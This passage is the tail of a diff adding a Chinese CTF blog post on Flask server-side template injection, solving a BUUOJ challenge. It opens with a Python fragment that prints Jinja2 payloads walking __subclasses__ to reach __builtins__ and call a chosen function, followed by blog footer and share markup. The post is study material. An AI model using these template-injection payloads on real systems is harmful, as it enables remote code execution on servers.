<span class="keyword">if</span> (<span class="built_in">eval</span>(<span class="string">&#x27;&quot;&#x27;</span>+goal+<span class="string">&#x27;&quot; in i.&#x27;</span>+attr+<span class="string">&#x27;.__globals__[&quot;__builtins__&quot;].keys()&#x27;</span>)):</span><br><span class="line">                            <span class="keyword">if</span> pay != <span class="number">1</span>:</span><br><span class="line">                                <span class="built_in">print</span>(index,i.__name__,<span class="string">&quot;:&quot;</span>, attr, goal)</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;&quot;</span> + i.__name__ + <span class="string">&quot;&#x27; %&#125;&#123;&#123; c.&quot;</span> + attr + <span class="string">&quot;.__globals__[&#x27;__builtins__&#x27;].&quot;</span> + goal + <span class="string">&quot;(\&quot;[evil]\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%90%86%E8%A7%A3flask-ssti"><span class="toc-number">1.</span> <span class="toc-text">进一步理解flask-ssti</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUOJ-FLASK-APP-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">BUUOJ FLASK-APP 题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%81%9A%E6%B3%95%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">第一种做法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%81%9A%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">第二种做法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-number">1.2.</span> <span class="toc-text">思考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&text=再谈flask-ssti"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&title=再谈flask-ssti"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&is_video=false&description=再谈flask-ssti"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=再谈flask-ssti&body=Check out this article: https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&title=再谈flask-ssti"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&title=再谈flask-ssti"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&title=再谈flask-ssti"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&title=再谈flask-ssti"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&name=再谈flask-ssti&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&t=再谈flask-ssti"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Polo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
